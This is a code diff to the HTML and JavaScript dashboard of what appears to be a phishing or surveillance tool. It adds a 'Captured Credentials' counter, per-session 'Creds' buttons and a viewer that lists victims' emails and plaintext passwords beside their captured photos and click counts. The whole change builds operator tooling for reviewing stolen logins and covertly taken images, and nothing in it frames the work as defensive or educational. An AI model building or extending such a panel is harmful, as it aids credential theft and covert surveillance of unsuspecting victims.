@@ -61,6 +61,9 @@
             color: rgba(255,255,255,0.5);
             margin-top: 5px;
         }
+        .stat-card .number.credentials {
+            color: #f472b6;
+        }
         .btn-primary {
             background: linear-gradient(90deg, #c084fc, #ec4899);
             border: none;
@@ -168,7 +171,7 @@
         .copy-btn:hover {
             background: rgba(255,255,255,0.2);
         }
-        .view-photos-btn {
+        .view-btn {
             background: rgba(192,132,252,0.2);
             border: 1px solid rgba(192,132,252,0.3);
             color: #c084fc;
@@ -177,8 +180,15 @@
             cursor: pointer;
             font-size: 11px;
         }
-        .view-photos-btn:hover {
+        .view-btn:hover {
             background: rgba(192,132,252,0.3);
+        }
+        .view-btn.credentials-btn {
+            border-color: rgba(244,114,182,0.3);
+            color: #f472b6;
+        }
+        .view-btn.credentials-btn:hover {
+            background: rgba(244,114,182,0.2);
         }
         .no-sessions {
             color: rgba(255,255,255,0.3);
@@ -218,8 +228,8 @@
             <div class="label">Photos Captured</div>
         </div>
         <div class="stat-card">
-            <div class="number" id="totalClicks">0</div>
-            <div class="label">Total Clicks</div>
+            <div class="number credentials" id="totalCredentials">0</div>
+            <div class="label">🔐 Credentials</div>
         </div>
     </div>
     
@@ -307,12 +317,6 @@
                                 .back-btn:hover {
                                     background: rgba(255,255,255,0.2);
                                 }
-                                .no-photos {
-                                    text-align: center;
-                                    color: rgba(255,255,255,0.3);
-                                    padding: 40px;
-                                    width: 100%;
-                                }
                             </style>
                         </head>
                         <body>
@@ -326,6 +330,7 @@
                                     </div>
                                 </div>
                             `).join('')}
+                            ${data.photos.length === 0 ? '<p style="color:rgba(255,255,255,0.3);width:100%;text-align:center;">No photos</p>' : ''}
                         </body>
                         </html>
                     `);
@@ -335,6 +340,104 @@
                 }
             } catch (err) {
                 alert('Failed to load photos: ' + err.message);
+            }
+        }
+
+        // View credentials for a session
+        async function viewCredentials(sessionId) {
+            try {
+                const res = await fetch(`/api/credentials/${sessionId}`);
+                const data = await res.json();
+                
+                if (data.credentials && data.credentials.length > 0) {
+                    const win = window.open('', '_blank');
+                    win.document.write(`
+                        <html>
+                        <head>
+                            <title>🔐 Captured Credentials</title>
+                            <style>
+                                body { 
+                                    font-family: 'Segoe UI', sans-serif; 
+                                    background: #0a0a1a; 
+                                    color: #fff; 
+                                    padding: 20px; 
+                                    display: flex;
+                                    flex-direction: column;
+                                    align-items: center;
+                                    gap: 16px;
+                                }
+                                .cred-card {
+                                    background: rgba(255,255,255,0.05);
+                                    border-radius: 16px;
+                                    padding: 20px 24px;
+                                    border: 1px solid rgba(244,114,182,0.2);
+                                    width: 100%;
+                                    max-width: 500px;
+                                    display: flex;
+                                    justify-content: space-between;
+                                    align-items: center;
+                                    flex-wrap: wrap;
+                                    gap: 10px;
+                                }
+                                .cred-card .email {
+                                    color: #c084fc;
+                                    font-weight: 600;
+                                }
+                                .cred-card .password {
+                                    color: #f472b6;
+                                    font-family: 'Courier New', monospace;
+                                }
+                                .cred-card .time {
+                                    font-size: 11px;
+                                    color: rgba(255,255,255,0.3);
+                                    width: 100%;
+                                }
+                                h1 {
+                                    background: linear-gradient(90deg, #c084fc, #ec4899);
+                                    -webkit-background-clip: text;
+                                    -webkit-text-fill-color: transparent;
+                                    text-align: center;
+                                }
+                                .back-btn {
+                                    background: rgba(255,255,255,0.1);
+                                    border: none;
+                                    color: #fff;
+                                    padding: 10px 24px;
+                                    border-radius: 10px;
+                                    cursor: pointer;
+                                    font-size: 14px;
+                                    width: 100%;
+                                    max-width: 500px;
+                                }
+                                .back-btn:hover {
+                                    background: rgba(255,255,255,0.2);
+                                }
+                                .no-data {
+                                    color: rgba(255,255,255,0.3);
+                                    text-align: center;
+                                }
+                            </style>
+                        </head>
+                        <body>
+                            <button class="back-btn" onclick="window.close()">⬅ Close</button>
+                            <h1>🔐 Captured Credentials</h1>
+                            ${data.credentials.map(c => `
+                                <div class="cred-card">
+                                    <span class="email">📧 ${c.email}</span>
+                                    <span class="password">🔑 ${c.password}</span>
+                                    <span class="time">${new Date(c.timestamp).toLocaleString()}</span>
+                                </div>
+                            `).join('')}
+                            ${data.credentials.length === 0 ? '<p class="no-data">No credentials captured</p>' : ''}
+                        </body>
+                        </html>
+                    `);
+                    win.document.close();
+                } else {
+                    alert('No credentials found for this session.');
+                }
+            } catch (err) {
+                alert('Failed to load credentials: ' + err.message);
             }
         }
 
@@ -348,7 +451,7 @@
                 document.getElementById('totalSessions').textContent = sessions.length;
                 document.getElementById('activeSessions').textContent = sessions.filter(s => s.status === 'ACTIVE').length;
                 document.getElementById('totalPhotos').textContent = sessions.reduce((sum, s) => sum + (s.photos || 0), 0);
-                document.getElementById('totalClicks').textContent = sessions.reduce((sum, s) => sum + (s.clicks || 0), 0);
+                document.getElementById('totalCredentials').textContent = sessions.reduce((sum, s) => sum + (s.credentials || 0), 0);
                 
                 const list = document.getElementById('sessionsList');
                 if (sessions.length === 0) {
@@ -360,22 +463,15 @@
                     <div class="session-item ${s.status === 'ACTIVE' ? 'active' : ''}">
                         <div class="session-info">
                             <div class="session-id">${s.id}</div>
-                            <div class="session-details">Clicks: ${s.clicks} · Photos: ${s.photos} · Created: ${new Date(s.created).toLocaleString()}</div>
+                            <div class="session-details">Clicks: ${s.clicks} · Photos: ${s.photos} · Credentials: ${s.credentials || 0} · Created: ${new Date(s.created).toLocaleString()}</div>
                         </div>
                         <div class="session-actions">
                             <span class="session-status ${s.status === 'ACTIVE' ? 'status-active' : 'status-waiting'}">${s.status}</span>
-                            ${s.photos > 0 ? `<button class="view-photos-btn" data-session="${s.id}">📸 View Photos</button>` : ''}
+                            ${s.photos > 0 ? `<button class="view-btn" onclick="viewPhotos('${s.id}')">📸 Photos</button>` : ''}
+                            ${s.credentials > 0 ? `<button class="view-btn credentials-btn" onclick="viewCredentials('${s.id}')">🔐 Creds</button>` : ''}
                         </div>
                     </div>
                 `).join('');
-
-                // Add event listeners for view photo buttons
-                document.querySelectorAll('.view-photos-btn').forEach(btn => {
-                    btn.addEventListener('click', async function() {
-                        const sessionId = this.dataset.session;
-                        await viewPhotos(sessionId);
-                    });
-                });
 
             } catch (err) {
                 console.error('Failed to fetch dashboard:', err);
